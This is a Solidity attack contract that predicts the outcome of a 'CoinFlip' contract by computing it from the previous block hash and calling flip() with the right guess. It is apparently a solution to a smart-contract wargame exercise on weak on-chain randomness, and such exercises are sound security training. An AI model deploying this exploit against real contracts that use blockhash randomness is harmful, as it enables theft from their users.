// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import "./CoinFlip.sol";

contract AttackingCoinFlip {
    uint256 private lastHash;
    address public contractAddress;
    uint256 private constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        bool correctGuess = getFlipGuess(true) == true;
        CoinFlip coinFlip = CoinFlip(contractAddress);
        coinFlip.flip(correctGuess);
    }

    function getFlipGuess(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert("SAME_BLOCK");
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            return true;
        } else {
            return false;
        }
    }
}
